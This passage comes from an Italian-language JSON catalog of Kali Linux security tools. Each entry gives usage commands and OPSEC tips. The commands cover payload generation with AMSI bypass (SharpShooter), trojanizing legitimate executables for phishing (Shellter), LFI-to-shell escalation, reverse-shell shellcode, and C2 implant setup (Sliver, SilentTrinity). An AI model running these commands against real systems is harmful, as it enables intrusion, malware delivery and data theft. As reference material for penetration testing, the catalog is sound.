visualizzazione rischi ACL.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> enumeration AD monitorata da MDI/ATA.</p><p><strong>Volume:</strong> collection genera molte query LDAP.</p><p><strong>Stealth:</strong> usare collection methods selettivi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "sharpshooter",
    "name": "sharpshooter",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sharpshooter/",
    "desc": "Genera payload stageless in VBA, JS, HTA con tecniche di evasione AV integrate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpShooter</strong> genera payload stageless per initial access in formati VBA, JavaScript, HTA, VBS. Include tecniche di evasione AV/AMSI integrate, sandbox detection e multiple delivery methods per campagne red team.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Formats:</strong> VBA macro, JS, HTA, VBS, SCT</p><p><strong>Stageless:</strong> payload completo nel documento</p><p><strong>AMSI Bypass:</strong> tecniche anti-AMSI integrate</p><p><strong>Sandbox Evasion:</strong> detection ambiente analisi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera HTA con shellcode\nSharpShooter.py --payload hta --delivery web --output payload.hta --shellcode shellcode.bin\n\n# VBA macro\nSharpShooter.py --payload vba --delivery macro --output macro.vba\n\n# Con AMSI bypass\nSharpShooter.py --payload js --amsi amsienable</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, initial access via macro/script malevoli.</p><p>Per <strong>phishing</strong>, payload per allegati email.</p><p>Per <strong>testing</strong>, verifica detection capabilities AV.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> payload noti, detection rate variabile.</p><p><strong>Customization:</strong> modificare template per evasione.</p><p><strong>Delivery:</strong> hosting payload richiede infrastruttura.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "shellfire",
    "name": "shellfire",
    "version": "0.14",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/shellfire/",
    "desc": "Sfrutta vulnerabilità LFI per ottenere shell remote su server web vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Shellfire</strong> automatizza lo sfruttamento di vulnerabilità LFI (Local File Inclusion) per ottenere shell remote. Utilizza tecniche come log poisoning, /proc/self/environ injection e PHP wrappers per escalare LFI a RCE.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LFI to RCE:</strong> escalation automatica da LFI a shell</p><p><strong>Log Poisoning:</strong> injection in log files per code execution</p><p><strong>PHP Wrappers:</strong> base64, data, expect per bypass</p><p><strong>Auto Shell:</strong> upload automatico webshell</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Exploit LFI automatico\nshellfire -u \"http://target/page.php?file=\" -l\n\n# Con tecnica specifica\nshellfire -u \"http://target/page.php?file=\" -t logpoisoning\n\n# PHP wrapper\nshellfire -u \"http://target/page.php?file=\" -t phpwrapper</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web exploitation</strong>, escalation LFI trovate durante pentest.</p><p>Per <strong>CTF</strong>, challenge con vulnerabilità LFI.</p><p>Per <strong>research</strong>, test tecniche LFI to RCE.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logs:</strong> tentativi LFI loggati dal web server.</p><p><strong>WAF:</strong> pattern LFI comuni bloccati.</p><p><strong>Cleanup:</strong> webshell uploadate vanno rimosse.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "shellter",
    "name": "shellter",
    "version": "7.2",
    "icon": "../app/icons/shellter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/shellter/",
    "desc": "Inietta shellcode in PE Windows legittimi per bypass AV con tecniche polimorfiche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Shellter</strong> è uno strumento di dynamic PE infection che inietta shellcode in eseguibili Windows legittimi. Utilizza tecniche polimorfiche e anti-debug per evadere antivirus mantenendo la funzionalità originale del PE.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dynamic Injection:</strong> analizza execution flow e inietta in code caves</p><p><strong>Polymorphic Engine:</strong> genera varianti uniche per ogni infezione</p><p><strong>Stealth Mode:</strong> mantiene funzionalità originale del PE</p><p><strong>Custom Payload:</strong> supporta shellcode custom oltre a Metasploit</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Shellter in modalità automatica\nshellter -a\n\n# Modalità interattiva (menu-driven)\nshellter\n\n# Workflow tipico:\n# 1. Selezionare PE target (putty.exe, 7z.exe)\n# 2. Scegliere payload (Meterpreter, shell)\n# 3. Configurare LHOST/LPORT\n# 4. Output: PE trojanizzato</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AV bypass</strong>, crea payload che evadono signature-based detection.</p><p>Per <strong>phishing</strong>, distribuisce malware mascherato da software legittimo.</p><p>Per <strong>persistence</strong>, sostituisce eseguibili comuni con versioni trojanizzate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> behavioral analysis può rilevare l'attività post-injection.</p><p><strong>Signatures:</strong> PE modificati possono avere hash diversi.</p><p><strong>Reputation:</strong> download non firmati sono più sospetti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "sherlock",
    "name": "sherlock",
    "version": "0.15.0",
    "icon": "../app/icons/sherlock-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sherlock/",
    "desc": "Trova account social collegati a username su 400+ siti web e piattaforme online.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sherlock</strong> è uno strumento OSINT che ricerca username su oltre 400 siti web e social network. Identifica account collegati a un'identità online analizzando la disponibilità del nome utente su diverse piattaforme.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Platform Search:</strong> verifica 400+ siti web simultaneamente</p><p><strong>Result Export:</strong> salva risultati in CSV, JSON, TXT</p><p><strong>Proxy Support:</strong> routing attraverso Tor o proxy HTTP</p><p><strong>Rate Limiting:</strong> controllo velocità per evitare blocchi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca username su tutti i siti\nsherlock username\n\n# Cerca multipli username\nsherlock user1 user2 user3\n\n# Output in CSV con timeout\nsherlock --csv --timeout 10 username\n\n# Usa Tor per anonimizzazione\nsherlock --tor username\n\n# Mostra solo risultati positivi\nsherlock --print-found username</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT investigation</strong>, mappa la presenza online di un target.</p><p>Per <strong>digital footprint</strong>, identifica account associati a un'identità.</p><p>Per <strong>due diligence</strong>, verifica profili social prima di assunzioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> ricerche aggressive possono causare ban IP.</p><p><strong>False Positives:</strong> omonimia richiede verifica manuale.</p><p><strong>Privacy:</strong> usare Tor per ricerche sensibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "sickle-tool",
    "name": "sickle-tool",
    "version": "3.1.0",
    "icon": "../app/icons/sickle-tool-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sickle-tool/",
    "desc": "Sviluppo shellcode: genera, formatta e analizza payload per exploit development.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sickle è un payload development tool che aiuta nella creazione, formattazione e analisi di shellcode. Offre moduli per generazione, encoding e comparazione di payload con supporto per multiple architetture.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Payload Generation:</strong> crea shellcode per varie architetture</p><p><strong>Format Output:</strong> converte in C, Python, PowerShell, Ruby</p><p><strong>Bad Char Detection:</strong> identifica caratteri problematici nel payload</p><p><strong>Disassembly:</strong> analizza shellcode esistente</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera payload formattato in C\nsickle -p linux/x86/shell_reverse_tcp -f c\n\n# Controlla bad characters\nsickle -r payload.bin -b '\\x00\\x0a\\x0d'\n\n# Disassembla shellcode\nsickle -d -r payload.bin -a x86\n\n# Converti hex dump in formato Python\nsickle -f python -r raw_shellcode.bin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>exploit development</strong>, prepara shellcode per buffer overflow.</p><p>Per <strong>bad char analysis</strong>, identifica byte da evitare.</p><p>Per <strong>format conversion</strong>, trasforma payload per diversi linguaggi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> payload standard sono rilevati da AV.</p><p><strong>Encoding:</strong> usare encoder per evadere signatures.</p><p><strong>Testing:</strong> verificare in ambiente controllato prima dell'uso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "sidguesser",
    "name": "sidguesser",
    "version": "1.0.5",
    "icon": "../app/icons/sidguesser-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sidguesser/",
    "desc": "Brute force SID Oracle Database per identificare istanze e database disponibili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SIDGuesser</strong> è uno strumento per enumerare SID (System Identifier) di Oracle Database. Effettua brute force sul TNS listener per scoprire istanze database valide quando il listener non rivela direttamente questa informazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SID Brute Force:</strong> prova lista di SID comuni e custom</p><p><strong>TNS Interaction:</strong> comunica direttamente con Oracle TNS listener</p><p><strong>Wordlist Support:</strong> utilizza dizionari personalizzati</p><p><strong>Multi-target:</strong> scan di range di IP per Oracle</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Bruteforce SID con wordlist default\nsidguesser -i 192.168.1.100\n\n# Usa wordlist personalizzata\nsidguesser -i 192.168.1.100 -d custom_sids.txt\n\n# Specifica porta TNS listener\nsidguesser -i 192.168.1.100 -p 1521\n\n# Range di target\nsidguesser -i 192.168.1.0/24 -d sids.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Oracle enumeration</strong>, scopre database nascosti.</p><p>Per <strong>pentest database</strong>, identifica target per attacchi successivi.</p><p>Per <strong>inventory</strong>, mappa istanze Oracle in rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> tentativi falliti possono essere loggati dal listener.</p><p><strong>Rumore:</strong> brute force genera traffico anomalo.</p><p><strong>Lockout:</strong> alcuni sistemi bloccano dopo troppi tentativi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "silenttrinity",
    "name": "silenttrinity",
    "version": "0.4.6dev~20200310",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/silenttrinity/",
    "desc": "Framework C2 con agent Python/Boo per operazioni red team con evasion avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SilentTrinity</strong> è un framework C2 post-exploitation che utilizza Python e Boo language per agent execution. Sfrutta .NET DLR per esecuzione in-memory evitando signature detection tradizionali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>In-Memory Execution:</strong> nessun file su disco tramite .NET DLR</p><p><strong>Boo Language:</strong> scripting dinamico per moduli custom</p><p><strong>Multi-Protocol:</strong> HTTP/HTTPS/WMI/DNS per comunicazione</p><p><strong>Plugin System:</strong> moduli per credential theft, lateral movement</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia teamserver\nst teamserver --ip 0.0.0.0 --port 5000\n\n# Client connection\nst client --ip server_ip --port 5000\n\n# Genera stager\nlisteners\nuse http\nset BindIP 0.0.0.0\nstagers\nuse msbuild\ngenerate</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team ops</strong>, mantiene accesso persistente con evasion.</p><p>Per <strong>lateral movement</strong>, esegue moduli su target compromessi.</p><p>Per <strong>AV bypass</strong>, sfrutta esecuzione in-memory via .NET.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> framework noto, stager possono essere rilevati.</p><p><strong>Behavior:</strong> attività sospette su CLR sono monitorabili.</p><p><strong>Network:</strong> traffic analysis può identificare beacon patterns.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "skipfish",
    "name": "skipfish",
    "version": "2.10b",
    "icon": "../app/icons/skipfish-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/skipfish/",
    "desc": "Web scanner attivo ad alte prestazioni per mapping e vulnerability assessment.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Skipfish</strong> è uno scanner web ad alte prestazioni sviluppato da Google. Effettua crawling e security assessment automatico di applicazioni web generando report HTML interattivi con vulnerabilità identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Performance:</strong> oltre 2000 request/secondo con C asincrono</p><p><strong>Adaptive Crawling:</strong> riconoscimento automatico di strutture web</p><p><strong>Vulnerability Detection:</strong> XSS, SQL injection, directory traversal</p><p><strong>HTML Reporting:</strong> report interattivi con sitemap visuale</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base con output directory\nskipfish -o output_dir http://target.com/\n\n# Con autenticazione\nskipfish -o output -A user:pass http://target.com/\n\n# Usa wordlist per directory brute\nskipfish -o output -W wordlist.txt http://target.com/\n\n# Limita scope\nskipfish -o output -I /app/ http://target.com/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web assessment</strong>, mappa e testa applicazioni web.</p><p>Per <strong>security audit</strong>, identifica vulnerabilità comuni.</p><p>Per <strong>compliance</strong>, verifica sicurezza prima del go-live.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> genera molto traffico, facilmente rilevabile.</p><p><strong>Logging:</strong> richieste loggabili dal web server.</p><p><strong>Authorization:</strong> solo su target autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sleuthkit",
    "name": "sleuthkit",
    "version": "4.12.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sleuthkit/",
    "desc": "Suite forensics per analisi filesystem: timeline, file recovery, metadata extraction.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>The Sleuth Kit (TSK) è una suite di tool forensi open source per analisi di filesystem e volumi. Include strumenti CLI per file recovery, timeline analysis, metadata extraction e supporta numerosi filesystem.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Filesystem Analysis:</strong> NTFS, FAT, EXT, HFS+, APFS</p><p><strong>Timeline Creation:</strong> mactime genera timeline eventi</p><p><strong>File Recovery:</strong> recupera file cancellati da slack space</p><p><strong>Metadata Extraction:</strong> analizza MFT, inode, directory entries</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lista partizioni di un'immagine\nmmls disk.img\n\n# Elenca file in filesystem\nfls -r -o 2048 disk.img\n\n# Estrai file specifico per inode\nicat -o 2048 disk.img 12345 > recovered_file\n\n# Crea timeline\nfls -m '/' -r -o 2048 disk.img > body\nmactime -b body > timeline.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>digital forensics</strong>, analizza dischi in indagini.</p><p>Per <strong>incident response</strong>, recupera file cancellati da malware.</p><p>Per <strong>timeline analysis</strong>, ricostruisce sequenza eventi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Write Blocking:</strong> usare sempre write blocker su evidence originale.</p><p><strong>Chain of Custody:</strong> documentare ogni operazione.</p><p><strong>Imaging:</strong> lavorare sempre su copie forensi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "sliver",
    "name": "sliver",
    "version": "1.5.42",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sliver/",
    "desc": "Framework C2 moderno con implant Go cross-platform, mTLS, WireGuard e pivoting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sliver</strong> è un framework C2 open source sviluppato da BishopFox. Offre implant cross-platform in Go, supporto multi-operatore, comunicazioni cifrate via mTLS/WireGuard e capacità avanzate di pivoting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-Platform Implants:</strong> Windows, Linux, macOS in Go</p><p><strong>Encrypted Comms:</strong> mTLS, WireGuard, HTTP(S), DNS</p><p><strong>Multiplayer:</strong> supporto team multi-operatore</p><p><strong>Pivoting:</strong> TCP/UDP pivots, port forwarding, SOCKS5</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia server Sliver\nsliver-server\n\n# Genera implant\ngenerate --mtls host:443 --os windows --arch amd64\n\n# Avvia listener mTLS\nmtls --lhost 0.0.0.0 --lport 443\n\n# Interagisci con sessione\nuse [session_id]\ninfo\nps\nexecute-assembly seatbelt.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team engagement</strong>, gestisce operazioni C2 complesse.</p><p>Per <strong>adversary simulation</strong>, emula TTPs realistiche.</p><p>Per <strong>pivoting</strong>, naviga attraverso reti segmentate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> implant Go hanno caratteristiche riconoscibili.</p><p><strong>Network:</strong> traffic patterns analizzabili.</p><p><strong>Memory:</strong> reflective loading può essere detectato da EDR.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "smbmap",
    "name": "smbmap",
    "version": "1.10.7",
    "icon": "../app/icons/smbmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/smbmap/",
    "desc": "Enumera share SMB, permessi, file e consente upload/download/execution remota.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SMBMap</strong> è uno strumento per enumerazione e interazione con share SMB. Elenca share accessibili, permessi, contenuti e permette operazioni come download, upload ed esecuzione remota di comandi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Share Enumeration:</strong> lista share e permessi (read/write)</p><p><strong>File Operations:</strong> download, upload, delete file remoti</p><p><strong>Command Execution:</strong> esecuzione comandi via SMB</p><p><strong>Recursive Listing:</strong> elenca contenuti ricorsivamente</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera share con null session\nsmbmap -H 192.168.1.100\n\n# Con credenziali\nsmbmap -H 192.168.1.100 -u user -p password\n\n# Lista ricorsiva di uno share\nsmbmap -H 192.168.1.100 -u user -p pass -r share$\n\n# Download file\nsmbmap -H 192.168.1.100 -u user -p pass --download 'share$/file.txt'\n\n# Esegui comando\nsmbmap -H 192.168.1.100 -u admin -p pass -x 'whoami'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD enumeration</strong>, mappa share accessibili nel dominio.</p><p>Per <strong>data exfil</strong>, identifica file sensibili sugli share.</p><p>Per <strong>lateral movement</strong>, trova share scrivibili per payload.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> accessi SMB loggati nei Security logs.</p><p><strong>Failed Auth:</strong> tentativi falliti generano eventi 4625.</p><p><strong>Execution:</strong> -x crea processi visibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "smtp-user-enum",
    "name": "smtp-user-enum",
    "version": "1.2",
    "icon": "../app/icons/smtp-user-enum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/smtp-user-enum/",
    "desc": "Enumera utenti validi su server SMTP via VRFY, EXPN e RCPT TO per harvesting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SMTP-User-Enum</strong> è uno strumento per enumerare utenti validi su server SMTP. Utilizza i comandi VRFY, EXPN e RCPT TO per verificare l'esistenza di indirizzi email basandosi sulle risposte del server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>VRFY Method:</strong> verifica diretta esistenza utente</p><p><strong>EXPN Method:</strong> espande mailing list e alias</p><p><strong>RCPT TO Method:</strong> deduce esistenza da response codes</p><p><strong>Wordlist Attack:</strong> testa lista di username comuni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration con VRFY\nsmtp-user-enum -M VRFY -U users.txt -t mail.target.com\n\n# Enumeration con RCPT TO\nsmtp-user-enum -M RCPT -U users.txt -t mail.target.com\n\n# Con dominio specifico\nsmtp-user-enum -M RCPT -U users.txt -D target.com -t mail.target.com\n\n# Singolo utente\nsmtp-user-enum -M VRFY -u admin -t mail.target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>email harvesting</strong>, raccoglie indirizzi validi per phishing.</p><p>Per <strong>user enumeration</strong>, identifica account esistenti.</p><p>Per <strong>password attacks</strong>, prepara target list per spray.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> tentativi loggati dai mail server.</p><p><strong>Rate Limiting:</strong> molti server limitano query.</p><p><strong>Hardening:</strong> server moderni disabilitano VRFY/EXPN.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "sniffjoke",
    "name": "sniffjoke",
    "version": "0.4.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sniffjoke/",
    "desc": "Offusca traffico di rete per eludere IDS/IPS con tecniche di evasion TCP/IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SniffJoke</strong> è uno strumento di evasione che offusca il traffico di rete per eludere IDS/IPS. Inietta pacchetti malformati e utilizza tecniche TCP/IP per confondere i sistemi di analisi mantenendo la connessione valida.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Injection:</strong> inietta pacchetti spuri per confondere IDS</p><p><strong>TCP Evasion:</strong> sfrutta ambiguità nello stack TCP/IP</p><p><strong>Transparent Proxy:</strong> opera come proxy trasparente</p><p><strong>Plugin System:</strong> varie tecniche di evasione modulari</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia SniffJoke con configurazione default\nsniffjoke\n\n# Specifica interfaccia\nsniffjoke -i eth0\n\n# Modalità debug\nsniffjoke -d\n\n# Con plugin specifico\nsniffjoke --plugin fragmentation</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IDS evasion</strong>, bypassa detection durante assessment.</p><p>Per <strong>red team</strong>, nasconde traffico malevolo.</p><p>Per <strong>research</strong>, testa efficacia di sistemi di detection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> IDS moderni riconoscono pattern di evasion.</p><p><strong>Performance:</strong> può degradare velocità connessione.</p><p><strong>Compatibility:</strong> alcune tecniche non funzionano con tutti i target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "snmpcheck",
    "name": "snmpcheck",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/snmpcheck/",
    "desc": "Enumera informazioni SNMP da dispositivi di rete: interfacce, routing, processi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SNMPCheck</strong> è uno strumento per enumerazione SNMP che estrae informazioni dettagliate da dispositivi di rete. Raccoglie dati su interfacce, routing tables, processi in esecuzione, software installato e configurazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Device Enumeration:</strong> hostname, contatti, location, uptime</p><p><strong>Interface Info:</strong> IP, MAC, statistiche traffico</p><p><strong>Routing Tables:</strong> gateway, next-hop, metriche</p><p><strong>Process/Software:</strong> lista processi e programmi installati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration base con community public\nsnmpcheck -t 192.168.1.1\n\n# Con community string custom\nsnmpcheck -t 192.168.1.1 -c private\n\n# SNMPv3 con credenziali\nsnmpcheck -t 192.168.1.1 -v 3 -u user -l authPriv -a MD5 -A pass -x DES -X pass\n\n# Output verboso\nsnmpcheck -t 192.168.1.1 -v -c public</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network enumeration</strong>, mappa dispositivi e configurazioni.</p><p>Per <strong>vulnerability assessment</strong>, identifica sistemi con SNMP weak.</p><p>Per <strong>inventory</strong>, raccoglie info su hardware/software.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Community Strings:</strong> default strings sono banali.</p><p><strong>Logging:</strong> query SNMP possono essere loggate.</p><p><strong>Security:</strong> SNMPv1/v2 trasmettono in chiaro.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "snmpenum",
    "name": "snmpenum",
    "version": "0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/snmpenum/",
    "desc": "Script Perl per enumeration SNMP con query OID comuni per device discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SNMPEnum</strong> è uno script Perl per enumerazione SNMP che utilizza file di configurazione con OID comuni per estrarre informazioni da dispositivi di rete. Supporta query mirate per diversi tipi di device.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>OID Files:</strong> configurazioni per Windows, Linux, Cisco, etc.</p><p><strong>Bulk Queries:</strong> estrae multiple informazioni in una sessione</p><p><strong>Custom OID:</strong> supporta file OID personalizzati</p><p><strong>Output Parsing:</strong> formatta risultati leggibilmente</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration Windows\nsnmpenum -t 192.168.1.100 -c public -w\n\n# Enumeration con file OID custom\nsnmpenum -t 192.168.1.100 -c public -i linux.txt\n\n# Enumeration Cisco\nsnmpenum -t 192.168.1.1 -c public -i cisco.txt\n\n# Output verboso\nsnmpenum -t 192.168.1.100 -c public -w -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Windows enumeration</strong>, estrae utenti, share, servizi via SNMP.</p><p>Per <strong>network devices</strong>, raccoglie configurazioni router/switch.</p><p>Per <strong>discovery</strong>, identifica tipi di dispositivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffic:</strong> genera molte query SNMP.</p><p><strong>Detection:</strong> pattern riconoscibile da IDS.</p><p><strong>Community:</strong> brute force community può essere loggato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "sparrow-wifi",
    "name": "sparrow-wifi",
    "version": "0.0~git20240725",
    "icon": "../app/icons/sparrow-wifi-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sparrow-wifi/",
    "desc": "Analizzatore WiFi con GUI per spectrum analysis, geolocalizzazione e drone hunting.",
